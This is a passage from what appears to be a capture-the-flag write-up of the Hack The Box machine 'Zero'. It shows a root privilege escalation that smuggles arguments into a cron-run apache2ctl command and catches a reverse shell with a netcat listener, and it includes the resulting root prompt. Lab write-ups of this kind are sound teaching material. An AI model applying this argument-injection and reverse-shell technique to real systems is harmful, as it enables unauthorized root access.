+<span class="nb">sleep</span><span class="p">(</span><span class="mi">223</span><span class="p">);</span>
+</code></pre></div></div>
+<p>This sets the running process to <code class="language-plaintext highlighter-rouge">opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/errorlog -D</code>, which will become <code class="language-plaintext highlighter-rouge">opt/zroweb/sbin/apache2ctl -k start -d /opt/zroweb/conf -d /dev/shm/errorlog -D -t</code>. I’m stomping the <code class="language-plaintext highlighter-rouge">-t</code> by making it the string passed to the <code class="language-plaintext highlighter-rouge">-D</code>, which is just a name configuration parameter.</p>
+<p>In about a minute, I get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.234.62 46374
+bash: cannot set terminal process group (52934): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@zero:/dev/shm#</span><span class="w"> 
+</span></code></pre></div></div>
+<p>If something goes wrong, this attack can leave the Apache process running, which means the next time it runs on the cron the process will just respond that this server is running and quit. If it doesn’t work, I’ll need to rename the configuration directory to try again.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/08/12/htb-zero.html"></a>
+</article>
